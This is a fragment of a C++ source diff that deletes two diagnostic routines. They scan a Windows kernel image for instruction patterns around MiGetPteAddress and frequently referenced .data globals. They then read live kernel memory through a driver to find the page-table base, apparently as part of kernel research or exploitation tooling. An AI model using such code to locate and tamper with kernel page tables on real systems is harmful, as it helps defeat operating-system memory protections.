-    // ── Section 1: MiGetPteAddress pattern scan ───────────────────────────────
-    printf("=== Method 1: MiGetPteAddress code pattern (sar r64,9 anchor) ===\n\n");
-    {
-        std::map<DWORD, int> hits;
-        DWORD end = img.textFOA + img.textSz;
-        int anchors = 0;
-        for (DWORD i = img.textFOA; i + 4 < end; i++) {
-            if ((buf[i] != 0x48 && buf[i] != 0x49) || buf[i+1] != 0xC1) continue;
-            BYTE shiftAmt = buf[i+3];
-            if (shiftAmt != 0x09 && shiftAmt != 0x0C) continue;
-            BYTE modrm = buf[i+2];
-            if ((modrm & 0xF8) != 0xF8 && (modrm & 0xF8) != 0xE8) continue;
-            anchors++;
-            DWORD wStart = (i > img.textFOA + 8) ? (i - 8) : img.textFOA;
-            DWORD wEnd   = ((i + 56 + 7) < end)  ? (i + 56) : (end - 7);
-            for (DWORD j = wStart; j < wEnd; j++) {
-                if (j + 6 >= end) continue;
-                BYTE rex = buf[j], op = buf[j+1], modrm = buf[j+2];
-                if (rex != 0x48 && rex != 0x4C) continue;
-                if (op != 0x03) continue; // ADD only
-                if ((modrm & 0xC7) != 0x05) continue;
-                INT32 off32    = *reinterpret_cast<const INT32*>(&buf[j + 3]);
-                DWORD instrRVA = (j - img.textFOA) + img.textRVA;
-                DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
-                if (targetRVA >= img.dataRVA && targetRVA < img.dataEnd)
-                    hits[targetRVA]++;
-            }
-        }
-        printf("  shift-right-by-9/12 anchors found: %d\n\n", anchors);
-
-        std::vector<std::pair<int,DWORD>> ranked;
-        for (auto& kv : hits) ranked.push_back({kv.second, kv.first});
-        std::sort(ranked.begin(), ranked.end(), [](auto& a, auto& b){ return a.first > b.first; });
-
-        printf("  %-10s  %-6s  %-18s  %s\n", "RVA", "Hits", "RuntimeValue", "Status");
-        printf("  %-10s  %-6s  %-18s  %s\n", "----------", "------", "------------------", "------");
-        for (auto& [cnt, rva] : ranked) {
-            DWORD64 val = g_drv->Rd64(img.kBase + rva);
-            const char* status;
-            if (!g_drv->IsKernelVA(val))             status = "not-kernel-VA";
-            else if (val & ((1ULL<<39)-1))           status = "not-512GB-aligned";
-            else                                     status = "*** CANDIDATE ***";
-            printf("  0x%08X  %-6d  0x%016llX  %s\n", rva, cnt, val, status);
-        }
-        if (ranked.empty()) printf("  (no candidates found)\n");
-        printf("\n");
-    }
-
-    // ── Section 2: Reference-count scan ──────────────────────────────────────
-    printf("=== Method 2: Highest-reference-count .data global ===\n\n");
-    {
-        std::map<DWORD,int> refCnt;
-        DWORD end = img.textFOA + img.textSz;
-        for (DWORD i = img.textFOA; i + 7 < end; i++) {
-            DWORD rva = DecodeRipRelDataRef(buf, i, img.textFOA, img.textRVA,
-                                           img.dataRVA, img.dataEnd);
-            if (rva) refCnt[rva]++;
-        }
-
-        std::vector<std::pair<int,DWORD>> topN;
-        topN.reserve(refCnt.size());
-        for (auto& kv : refCnt) topN.push_back({kv.second, kv.first});
-        std::sort(topN.begin(), topN.end(), [](auto& a, auto& b){ return a.first > b.first; });
-
-        printf("  %-4s  %-10s  %-8s  %-18s  %s\n", "Rank", "RVA", "Refs", "RuntimeValue", "Status");
-        printf("  %-4s  %-10s  %-8s  %-18s  %s\n", "----", "----------", "--------", "------------------", "------");
-        size_t limit = topN.size() < 64 ? topN.size() : 64;
-        for (size_t rank = 0; rank < limit; rank++) {
-            DWORD   rva  = topN[rank].second;
-            int     cnt  = topN[rank].first;
-            DWORD64 val  = g_drv->Rd64(img.kBase + rva);
-            const char* status;
-            if (!g_drv->IsKernelVA(val))         status = "not-kernel-VA";
-            else if (val & ((1ULL<<39)-1))        status = "not-512GB-aligned";
-            else                                  status = "*** CANDIDATE ***";
-            printf("  %-4zu  0x%08X  %-8d  0x%016llX  %s\n", rank, rva, cnt, val, status);
-        }
-        printf("\n  Total unique .data targets referenced: %zu\n", refCnt.size());
-    }
 }
 
 // Each PTE covers 4096 bytes.  Byte offset into PTE array = (va >> 12) * 8 = va >> 9.
